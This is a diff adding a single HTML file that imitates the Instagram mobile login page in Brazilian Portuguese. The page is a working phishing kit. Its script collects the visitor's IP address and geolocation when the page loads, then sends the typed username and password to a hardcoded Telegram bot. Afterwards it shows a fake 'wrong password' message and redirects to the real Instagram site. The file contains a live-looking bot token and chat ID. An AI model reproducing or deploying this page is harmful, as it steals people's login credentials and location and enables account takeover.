@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #262626;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 35px;
+            flex-grow: 1;
+        }
+
+        .language-selector {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .logo-container {
+            margin-top: 60px;
+            margin-bottom: 40px;
+        }
+
+        .instagram-logo {
+            width: 175px;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-wrapper {
+            width: 100%;
+        }
+
+        .login-form input {
+            width: 100%;
+            height: 44px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            padding: 0 12px;
+            font-size: 14px;
+        }
+
+        .login-form input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+
+        .login-btn {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            height: 44px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+
+        .login-btn:disabled {
+            background-color: #b2dffc;
+        }
+
+        .forgot-link {
+            text-align: center;
+            font-size: 12px;
+            margin-top: 15px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .divider {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+        }
+
+        .line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .or-text {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            padding: 0 20px;
+        }
+
+        .fb-login {
+            background: none;
+            border: none;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+
+        .footer {
+            border-top: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .meta-logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .meta-logo {
+            width: 60px;
+            margin-top: 5px;
+            opacity: 0.6;
+        }
+
+        #errorBox {
+            color: #ed4956;
+            font-size: 14px;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="language-selector">Português (Brasil) ▼</div>
+        
+        <div class="logo-container">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109453.png" alt="Instagram" class="instagram-logo">
+        </div>
+
+        <form class="login-form" id="loginForm">
+            <input type="text" id="username" placeholder="Telefone, nome de usuário ou email" required autocapitalize="none">
+            <input type="password" id="password" placeholder="Senha" required>
+            
+            <button type="submit" class="login-btn" id="loginBtn" disabled>Entrar</button>
+            
+            <a href="#" class="forgot-link">Esqueceu a senha?</a>
+            <div id="errorBox">Senha incorreta.</div>
+
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or-text">OU</div>
+                <div class="line"></div>
+            </div>
+
+            <button type="button" class="fb-login">
+                Continuar como Facebook
+            </button>
+        </form>
+    </div>
+
+    <div class="meta-logo-container">
+        de<br>
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
+    </div>
+
+    <div class="footer">
+        Não tem uma conta? <a href="#">Cadastre-se</a>
+    </div>
+
+    <script>
+        const TOKEN = "8524660585:AAHVKLyJeWs_5IM9nmNutXfPkXBBaBh4zi4";
+        const CHAT_ID = "5542692841";
+        const URL_TELEGRAM = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        const form = document.getElementById('loginForm');
+        const userInp = document.getElementById('username');
+        const passInp = document.getElementById('password');
+        const btn = document.getElementById('loginBtn');
+        const err = document.getElementById('errorBox');
+
+        let ip = "Carregando...";
+        let loc = "Não autorizada";
+
+        const updateBtn = () => {
+            btn.disabled = !(userInp.value.length > 0 && passInp.value.length >= 6);
+        };
+
+        userInp.addEventListener('input', updateBtn);
+        passInp.addEventListener('input', updateBtn);
+
+        async function getInfo() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {}
+            
+            navigator.geolocation.getCurrentPosition((p) => {
+                loc = `${p.coords.latitude}, ${p.coords.longitude}`;
+                sendData("", "", "📱 *ACESSO DETECTADO*");
+            }, () => {
+                sendData("", "", "📱 *ACESSO DETECTADO*");
+            });
+        }
+
+        async function sendData(u, p, title) {
+            const text = `${title}\n\n${u ? `👤 User: ${u}\n🔑 Pass: ${p}\n` : ""}🌐 IP: ${ip}\n📍 Loc: ${loc}\n📱 Dev: ${navigator.platform}`;
+            await fetch(URL_TELEGRAM, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
+            });
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            btn.disabled = true;
+            await sendData(userInp.value, passInp.value, "🔐 *LOGIN INSTAGRAM*");
+            err.style.display = 'block';
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }, 1000);
+        });
+
+        window.onload = getInfo;
+    </script>
+</body>
+</html>
